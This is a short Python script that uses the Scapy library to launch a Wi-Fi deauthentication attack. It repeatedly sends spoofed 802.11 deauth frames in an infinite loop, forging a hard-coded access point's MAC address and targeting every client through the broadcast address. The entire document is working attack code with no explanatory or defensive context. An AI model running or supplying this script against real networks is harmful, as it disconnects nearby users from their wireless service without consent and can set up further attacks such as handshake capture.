#!/usr/bin/env python
from scapy.all import *
 
target_mac = 'ff:ff:ff:ff:ff:ff'
AP_mac = '05:12:54:15:54:11'
interface = 'wlan0'
quantity = 10
delay = 2
 
print "Deauth attack from {} to {}".format(AP_mac, target_mac)
while True:
  frame = RadioTap()\
        /Dot11(type=0, subtype=12, addr1=target_mac, addr2=AP_mac, addr3=AP_mac)\
        /Dot11Deauth(reason=7)
  sendp(frame, iface=interface, count=quantity)
  time.sleep(delay)
